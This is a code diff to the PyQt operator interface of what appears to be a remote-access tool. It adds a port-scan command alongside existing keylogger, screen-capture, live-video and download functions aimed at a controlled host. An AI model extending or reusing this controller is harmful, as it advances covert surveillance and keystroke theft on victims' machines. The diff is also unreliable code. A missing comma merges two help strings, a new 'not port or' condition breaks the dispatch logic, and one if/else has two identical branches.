@@ -1069,6 +1069,7 @@ class Ui_MainWindow2(object):
                              "-info                                Shows informations about host.\n",
                              "-fontsize <int>                      Sets the font size.\n",
                              "-history                             Shows the history of commands.\n",
+                             "-portscan                            Shows all opened ports on host.\n"
                              "-updates                             Get a list of installed update (only windows)\n",
                              "-antivirus                           Lists the installed Antivirus on host (only windows).\n"
                              "-softwares                           Lists the installed softwares on host.\n",
@@ -1364,6 +1365,18 @@ class Ui_MainWindow2(object):
                     f'{gcts}\nRequesting for update list, please wait.\n')
             self.lineEdit_2.clear()
 
+        elif '-portscan' in self.lineEdit_2.text():
+            self.port_scan = self.lineEdit_2.text()
+            self.call_sc(port=True)
+            gcts = self.host_terminal.text()
+            if gcts == self.host_terminal.text():
+                self.host_terminal.setText(
+                    f'Looking for opened ports, Please wait.\n')
+            else:
+                self.host_terminal.setText(
+                    f'Looking for opened ports, Please wait.\n')
+            self.lineEdit_2.clear()
+
         elif self.lineEdit_2.text() == '-antivirus':
             self.call_sc(ant=True)
             gcts = self.host_terminal.text()
@@ -1439,7 +1452,7 @@ class Ui_MainWindow2(object):
 
     def call_sc(self, btn_scr=False, sclk=False, sculk=False, coordinates=None, rec_start=False, rec_stop=False
                 , rec_get=False, st_strm=False, live_video=False, kl_start=False, kl_stop=False, kl_print=False,
-                soft_list=False, wget=False, wraw=False, ant=False, upd=False):
+                soft_list=False, wget=False, wraw=False, ant=False, upd=False, port=False):
         """
         The call_sc is responsible to write the command to the STDIN file of host "/bin/request/transfer/stdout/<tag>"
         and invoke the 'execute' "/bin/request/transfer/execute/<tag>" (if execute file is True the server will send the
@@ -1456,10 +1469,10 @@ class Ui_MainWindow2(object):
         now = datetime.datetime.now()
         now_minute = now.minute
 
-        if upd or ant or btn_scr or sclk or sculk or st_strm or soft_list or wget or wraw or kl_stop or kl_start or kl_print:
+        if port or upd or ant or btn_scr or sclk or sculk or st_strm or soft_list or wget or wraw or kl_stop or kl_start or kl_print:
             current_call = 'ignore'
 
-        if not upd and not ant and not kl_start and not kl_stop and not kl_print and not soft_list and not wget and not wraw and not btn_scr and not sclk and not sculk\
+        if not port or not upd and not ant and not kl_start and not kl_stop and not kl_print and not soft_list and not wget and not wraw and not btn_scr and not sclk and not sculk\
                 and not st_strm:
             if gotps == '' or gotps == ' ':
                 self.system_terminal.setText(f'>>> {current_call}\n')
@@ -1575,6 +1588,9 @@ class Ui_MainWindow2(object):
 
                 elif upd:
                     new_task.write('-update')
+
+                elif port:
+                    new_task.write(self.port_scan)
 
                 elif ant:
                     new_task.write('-antivirus')
